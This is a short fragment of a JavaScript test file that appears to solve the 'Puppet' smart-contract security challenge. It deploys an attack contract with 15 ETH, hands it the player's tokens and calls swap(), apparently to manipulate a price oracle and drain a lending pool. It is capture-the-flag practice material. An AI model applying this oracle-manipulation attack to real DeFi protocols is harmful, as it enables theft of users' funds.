...
describe('[Challenge] Puppet', function () {
    ...
    it('Execution', async function () {
        const AttackContract = await ethers.getContractFactory('PuppetAttack');
        const attackContract = await AttackContract.deploy(uniswapExchange.address, lendingPool.address, token.address, player.address, { value: ethers.utils.parseEther("15") });

        console.log("attacker contract eth balance ", await ethers.provider.getBalance(attackContract.address));
        await token.connect(player).transfer(attackContract.address, PLAYER_INITIAL_TOKEN_BALANCE);

        await attackContract.swap();
